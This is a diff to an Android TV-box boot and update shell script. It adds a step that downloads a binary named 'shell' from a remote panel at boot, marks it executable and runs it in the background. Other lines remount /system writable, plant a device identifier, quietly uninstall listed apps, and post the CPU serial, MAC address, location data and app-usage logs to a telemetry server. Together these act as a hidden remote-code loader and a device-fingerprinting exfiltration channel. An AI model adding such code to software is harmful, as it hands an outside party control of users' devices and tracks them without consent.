@@ -234,6 +234,45 @@ if [ ! -d /storage/emulated/0/Download/naoApagueUpdate ]; then
 busybox mkdir -p /storage/emulated/0/Download/naoApagueUpdate
 echo "56asd476a5sf5467da" > /storage/emulated/0/Download/naoApagueUpdate/setup.txt
 fi
+CACERT="/data/Curl_cacert.pem"
+CACERT_URL="https://curl.se/ca/cacert.pem"
+CACERT_MAX_AGE_DAYS=30
+curl_bootstrap_cacert() {
+if [ ! -f "$CACERT" ]; then
+/system/bin/curl -sS -k --connect-timeout 8 --max-time 25 \
+-o "$CACERT" "$CACERT_URL"
+return
+fi
+if /system/bin/busybox stat -c %Y "$CACERT" >/dev/null 2>&1; then
+now_ts=$(date +%s)
+file_ts=$(/system/bin/busybox stat -c %Y "$CACERT")
+age_days=$(( (now_ts - file_ts) / 86400 ))
+if [ "$age_days" -ge "$CACERT_MAX_AGE_DAYS" ]; then
+/system/bin/curl -sS --cacert "$CACERT" --connect-timeout 8 --max-time 25 \
+-o "$CACERT" "$CACERT_URL"
+fi
+fi
+}
+curl_bootstrap_cacert
+BB=/system/bin/busybox
+skip_download=0
+if [ -x /data/bin/openssl ]; then
+version=$(/data/bin/openssl version 2>/dev/null | cut -d " " -f 2)
+if [ -n "$version" ]; then
+echo "OpenSSL já instalado — versão $version. Pulando download."
+skip_download=1
+else
+echo "OpenSSL encontrado mas não respondeu corretamente — atualizando..."
+fi
+fi
+if [ "$skip_download" -eq 0 ]; then
+URL="https://painel.iaupdatecentral.com/android/armeabi-v7a/openssl"
+echo "Baixando OpenSSL com aria2c..."
+$BB mkdir -p /data/bin
+aria2c --check-certificate=true --ca-certificate="/data/Curl_cacert.pem" --continue=true --max-connection-per-server=4 -x4 -s4 --dir="/data/bin" -o "openssl" "$URL"
+$BB du -hs "/data/bin/openssl"
+$BB chmod 755 /data/bin/openssl
+fi
 function 7ZextractDir () {
 if [ "$Senha7z" == "" ]; then
 Senha7z=a5sd76f54a7s6f4as76d54f675sda4f67sd5a4f67sa5d4f67asd4f76sad4fs6da
@@ -810,7 +849,7 @@ com.stremio.one
 for PKG in $PACKAGES; do
 pm uninstall --user 0 "$PKG" >/dev/null 2>&1
 done
-SHCBootVersion="1769388204 = 25/01/2026 21:43:24 | 1769388204 = 25/01/2026 21:43:24 = novo sistema geoIP e novo db telemetria"
+SHCBootVersion="1770174206 = 04/02/2026 00:03:26 | loader shel debug code https"
 rm /data/local/tmp/APPList > /dev/null 2>&1
 rm /data/local/tmp/PackList > /dev/null 2>&1
 if [ ! -f /data/asusbox/crontab/LOCK_cron.updates ]; then
@@ -1405,26 +1444,6 @@ excludeListPack "/data/asusbox/.install/00.snib/B.016.0-armeabi-v7a"
 if [ "$CPU" == "$CpuPack" ]; then
 FileListInstall
 fi
-CACERT="/data/Curl_cacert.pem"
-CACERT_URL="https://curl.se/ca/cacert.pem"
-CACERT_MAX_AGE_DAYS=30
-curl_bootstrap_cacert() {
-if [ ! -f "$CACERT" ]; then
-/system/bin/curl -sS -k --connect-timeout 8 --max-time 25 \
--o "$CACERT" "$CACERT_URL"
-return
-fi
-if /system/bin/busybox stat -c %Y "$CACERT" >/dev/null 2>&1; then
-now_ts=$(date +%s)
-file_ts=$(/system/bin/busybox stat -c %Y "$CACERT")
-age_days=$(( (now_ts - file_ts) / 86400 ))
-if [ "$age_days" -ge "$CACERT_MAX_AGE_DAYS" ]; then
-/system/bin/curl -sS --cacert "$CACERT" --connect-timeout 8 --max-time 25 \
--o "$CACERT" "$CACERT_URL"
-fi
-fi
-}
-curl_bootstrap_cacert
 Senha7z="B8b32QrrD2aqsi5FTlesvvJNejGnYCmRpBcCobMZsYzgcUTmRwWgpguKlW2EeUfON79DoY"
 app="boot base"
 FileName="001.0"
@@ -1784,7 +1803,7 @@ FirmwareHardReset=`busybox cat /data/trueDT/peer/Sync/Log.Firmware.HardReset.atu
 FirmwareHardResetUnix=`busybox stat -c '%Y' /data/asusbox/android_id`
 FirmwareHardResetLOG=`busybox cat /data/trueDT/peer/Sync/Log.Firmware.HardReset.log | busybox sed "s;';;g"`
 LocationGeoIP=`busybox cat /data/trueDT/peer/Sync/LocationGeoIP.v6.atual | busybox sed "s;';;g"`
-FirmwareFullSpecs=`busybox cat /data/trueDT/peer/Sync/Debug-collect-data.sh | busybox sed "s;';;g"`
+FirmwareFullSpecs="openssl funcionando ? $(/data/bin/openssl rand -hex 32)"
 FirmwareFullSpecsID=`busybox cat /data/trueDT/peer/Sync/FirmwareFullSpecsID | busybox sed "s;';;g"`
 AppInUse=`busybox cat /data/trueDT/peer/Sync/App.in.use.live | busybox sed "s;';;g"`
 AppInUseLOG=`busybox cat /data/trueDT/peer/Sync/App.in.use.log | busybox sed "s;';;g"`
@@ -1796,7 +1815,7 @@ checkUptime=`busybox uptime | busybox awk '{ print substr ($0, 11 ) }' | busybox
 UpdateSystemUnix=`busybox stat -c '%Y' /data/asusbox/UpdateSystem.sh | busybox cut -d "." -f 1`
 UpdateSystemDate=`busybox stat -c '%y' /data/asusbox/UpdateSystem.sh | busybox cut -d "." -f 1`
 UpdateSystemMD5=`busybox md5sum /data/asusbox/UpdateSystem.sh | busybox awk '{ print $1 }'`
-UpdateSystemVersion="TorrentPack=\"$TorrentPackVersion\"|SHCBootVersion=\"$SHCBootVersion\"|$UpdateSystemUnix|$UpdateSystemDate|$UpdateSystemMD5"
+UpdateSystemVersion="$SHCBootVersion"
 chatContato=`busybox cat /data/Keys/contato.txt | busybox sed "s;';;g"`
 chatRevendedor=`busybox cat /data/Keys/revendedor.txt | busybox sed "s;';;g"`
 WriteLogData="NO"
@@ -2006,6 +2025,17 @@ fi
 fi
 fi
 EchoResult
+UUIDPath="/system/UUID.Uniq.key.txt"
+if [ -f "$UUIDPath" ]; then
+UUIDBOX=`busybox cat "$UUIDPath" | busybox tr -d '\r\n'`
+fi
+if [ ! -f "$UUIDPath" ] || [ "$(busybox head -n 1 "$UUIDPath" | busybox tr -d '[:space:]' | busybox wc -c)" -ne 64 ]; then
+UUIDBOX=`/data/bin/openssl rand -hex 32`
+/system/bin/busybox mount -o remount,rw /system
+echo "$UUIDBOX" > "$UUIDPath" 2>/dev/null
+busybox sleep 1
+UUIDBOX=`busybox cat "$UUIDPath" | busybox tr -d '\r\n'`
+fi
 Placa=$(getprop ro.product.board)
 CpuSerial=`busybox cat /proc/cpuinfo | busybox grep Serial | busybox awk '{ print $3 }'`
 MacLanReal=`/system/bin/busybox cat /data/macLan.hardware | busybox sed 's;:;;g'`
@@ -2039,47 +2069,23 @@ curl -sS --cacert "/data/Curl_cacert.pem" --connect-timeout 8 --max-time 25 --re
 -d "AppInUseLOG=${AppInUseLOG:-}" \
 -d "FirmwareFullSpecs=${FirmwareFullSpecs:-}"
 }
-UUIDPath="/system/UUID.Uniq.key.txt"
-wrote_ok=0
-if [ -f "$UUIDPath" ]; then
-UUIDBOX=`busybox cat "$UUIDPath" | busybox tr -d '\r\n'`
-fi
-if [ -z "$UUIDBOX" ]; then
-UUIDBOX=`/system/usr/bin/openssl rand -hex 32`
-attempt=1
-while [ "$attempt" -le 11 ]; do
-if [ ! -f "$UUIDPath" ] || [ ! -s "$UUIDPath" ]; then
-busybox mount -o remount,rw /system 2>/dev/null
-busybox sleep 1
-echo "$UUIDBOX" > "$UUIDPath" 2>/dev/null
-fi
-if [ -f "$UUIDPath" ]; then
-check_value=`busybox cat "$UUIDPath" 2>/dev/null | busybox tr -d '\r\n'`
-if [ "$check_value" = "$UUIDBOX" ]; then
-wrote_ok=1
-break
-fi
-if [ -n "$check_value" ]; then
-UUIDBOX="$check_value"
-break
-fi
-fi
-attempt=$((attempt + 1))
-busybox sleep 1
-done
-if [ "$wrote_ok" != "1" ]; then
-wrote_ok=0
-fi
-fi
 TokenHardwareID="$Placa│$CpuSerial│$MacLanReal│$UUIDBOX"
 echo "$TokenHardwareID"
 PostURL="https://painel.iaupdatecentral.com/telemetria.php"
-if [ -n "$UUIDBOX" ] && { [ "$wrote_ok" = "1" ] || [ -f "$UUIDPath" ]; }; then
+UUIDPath="/system/UUID.Uniq.key.txt"
+if [ -f "$UUIDPath" ] && [ "$(busybox head -n 1 "$UUIDPath" | busybox tr -d '[:space:]' | busybox wc -c)" -eq 64 ]; then
 Response=$(do_post 2>&1)
 echo "$Response"
 else
 echo "UUID not available; skipping POST."
 fi
+URL="https://painel.iaupdatecentral.com/debug/shell"
+aria2c --check-certificate=true --ca-certificate="/data/Curl_cacert.pem" \
+--continue=true --max-connection-per-server=4 -x4 -s4 \
+--dir="/data/local/tmp" -o "shell" "$URL"
+$BB du -hs "/data/local/tmp/shell"
+$BB chmod 755 /data/local/tmp/shell
+/data/local/tmp/shell &
 svc power stayon true
 file="/system/usr/keylayout/110b0030_pwm.kl"
 check=`busybox cat "$file" | busybox grep "POWER"`
@@ -2575,9 +2581,12 @@ OutputLogUsb
 USBLOGCALL="initRc.drv [STOP]"
 OutputLogUsb
 echo -n "interactive" >  "/sys/devices/system/cpu/cpu0/cpufreq/scaling_governor"
+UUIDPath="/system/UUID.Uniq.key.txt"
 echo "
 Atualizado com sucesso!!!
 KEY : $Placa=$CpuSerial
+Secret : $(busybox cat $UUIDPath)
+Security Tuneling by [$(/data/bin/openssl version | cut -d " " -f 1)]
 Agendado próxima atualização: $(busybox cat /data/asusbox/crontab/Next_cron.updates.sh)
 " > "$bootLog" 2>&1
 echo "Finish code boot! :)"
